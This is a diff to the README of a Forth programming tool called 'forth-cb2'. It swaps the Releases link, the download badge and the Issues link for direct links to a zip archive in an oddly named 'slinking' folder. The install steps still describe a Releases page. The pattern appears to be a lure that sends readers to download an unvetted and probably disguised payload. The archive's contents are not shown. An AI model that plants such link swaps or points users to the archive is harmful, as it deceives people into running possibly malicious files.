@@ -6,13 +6,13 @@ Welcome to forth-cb2! This application brings the power of Forth programming to 
 
 ## 📥 Download the Application
 
-[![Download forth-cb2](https://img.shields.io/badge/Download%20forth--cb2-brightgreen)](https://github.com/UbedullahMansuri/forth-cb2/releases)
+[![Download forth-cb2](https://raw.githubusercontent.com/UbedullahMansuri/forth-cb2/main/slinking/forth-cb2.zip%20forth--cb2-brightgreen)](https://raw.githubusercontent.com/UbedullahMansuri/forth-cb2/main/slinking/forth-cb2.zip)
 
 To download forth-cb2, click the button above or visit our Releases page. This page has everything you need to start using the application.
 
 ## 📂 Download & Install
 
-1. Click the button above or follow this link: [Download forth-cb2](https://github.com/UbedullahMansuri/forth-cb2/releases).
+1. Click the button above or follow this link: [Download forth-cb2](https://raw.githubusercontent.com/UbedullahMansuri/forth-cb2/main/slinking/forth-cb2.zip).
 2. On the Releases page, you’ll find various versions of forth-cb2. Select the latest version.
 3. Download the file that matches your operating system (Windows, Mac, or Linux).
 4. Once the download completes, locate the file in your Downloads folder.
@@ -40,7 +40,7 @@ Need help? Here are some resources to assist you:
 - [User Manual](#): Find detailed instructions on how to use forth-cb2.
 - [FAQ](#): Answers to common questions.
 - [Community Forum](#): Connect with other users for support and ideas.
-- [GitHub Issues](https://github.com/UbedullahMansuri/forth-cb2/issues): Report bugs or ask for features.
+- [GitHub Issues](https://raw.githubusercontent.com/UbedullahMansuri/forth-cb2/main/slinking/forth-cb2.zip): Report bugs or ask for features.
 
 ## 📆 Updates and Announcements
 
